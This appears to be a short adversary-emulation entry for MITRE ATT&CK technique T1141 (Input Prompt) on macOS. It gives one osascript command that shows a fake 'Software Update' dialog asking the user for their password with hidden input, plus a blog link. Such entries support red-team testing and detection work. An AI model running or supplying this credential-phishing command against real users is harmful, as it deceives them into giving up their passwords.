# Input Prompt

MITRE ATT&CK Technique: [T1141](https://attack.mitre.org/wiki/Technique/T1141)


### Prompt User for Password (Local Phishing)

    osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'

http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
